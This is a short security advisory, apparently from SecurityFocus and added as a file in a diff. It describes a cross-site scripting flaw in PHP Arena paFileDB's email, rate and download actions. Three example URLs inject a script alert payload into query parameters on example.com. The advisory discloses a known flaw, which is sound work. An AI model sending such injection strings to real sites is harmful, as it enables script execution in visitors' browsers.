@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/6018/info
+
+PHP Arena paFileDB is prone to cross-site scripting attacks.
+
+An attacker may construct a malicious link to the vulnerable script which contains arbitrary HTML and script code. If this link is visited by a web user, the attacker-supplied code will execute in their web client in the security context of the paFileDB site.
+
+This issue is in the "Email to Friend" function of the paFileDB script. 
+
+http://www.example.com/downloads/pafiledb.php?action=email&id=4?"<script>alert('Testing')</script>" 
+
+http://www.example.com/downloads/pafiledb.php?action=rate&id=4?"&lt;script&gt;alert('Testing')&lt;/script&gt;" 
+
+http://www.example.com/downloads/pafiledb.php?action=download&id=4?"&lt;script&gt;alert('Testing')&lt;/script&gt;"
